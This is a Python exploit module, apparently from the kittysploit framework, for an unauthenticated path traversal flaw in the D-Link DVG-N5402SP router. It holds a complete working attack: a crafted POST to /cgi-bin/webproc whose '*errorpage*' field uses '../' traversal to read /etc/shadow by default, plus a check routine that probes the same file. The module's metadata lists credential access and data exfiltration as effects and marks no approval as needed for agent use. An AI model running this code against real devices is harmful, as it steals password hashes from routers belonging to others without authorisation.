#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""D-Link DVG-N5402SP Path Traversal"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'D-Link DVG-N5402SP Path Traversal',
        'description': 'Module exploits D-Link DVG-N5402SP path traversal vulnerability, which allows reading files form the device.',
        'author': ['Karn Ganeshen', 'Marcin Bury'],
        
        'platform': Platform.LINUX,
        'references': ['https://www.exploit-db.com/exploits/39409/', 'http://ipositivesecurity.blogspot.com/2016/02/dlink-dvgn5402sp-multiple-vuln.html'],
        'tags': ['iot', 'router', 'lfi', 'unauth', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(8080, "Target HTTP port")
    filename = OptString('/etc/shadow', 'File to read')  # file to read

    def run(self):
        # address and parameters
        data = {
            "getpage": "html/index.html",
            "*errorpage*": "../../../../../../../../../../..{}".format(self.filename),
            "var%3Amenu": "setup",
            "var%3Apage": "connected",
            "var%": "",
            "objaction": "auth",
            "%3Ausername": "blah",
            "%3Apassword": "blah",
            "%3Aaction": "login",
            "%3Asessionid": "abcdefgh"
        }

        # connection
        response = self.http_request(
            method="POST",
            path="/cgi-bin/webproc",
            data=data
        )
        if response is None:
            return

        if response.status_code == 200:
            print_success("Exploit success")
            print_status("File: {}".format(self.filename))
            print_info(response.text)
        else:
            print_error("Exploit failed")
    def check(self):
        # address and parameters
        data = {
            "getpage": "html/index.html",
            "*errorpage*": "../../../../../../../../../../../etc/shadow",
            "var%3Amenu": "setup",
            "var%3Apage": "connected",
            "var%": "",
            "objaction": "auth",
            "%3Ausername": "blah",
            "%3Apassword": "blah",
            "%3Aaction": "login",
            "%3Asessionid": "abcdefgh"
        }

        # connection
        response = self.http_request(
            method="POST",
            path="/cgi-bin/webproc",
            data=data,
        )

        if response and ("/etc/shadow" in (response.text or '')):
            return True  # target vulnerable

        return False  # target not vulnerable
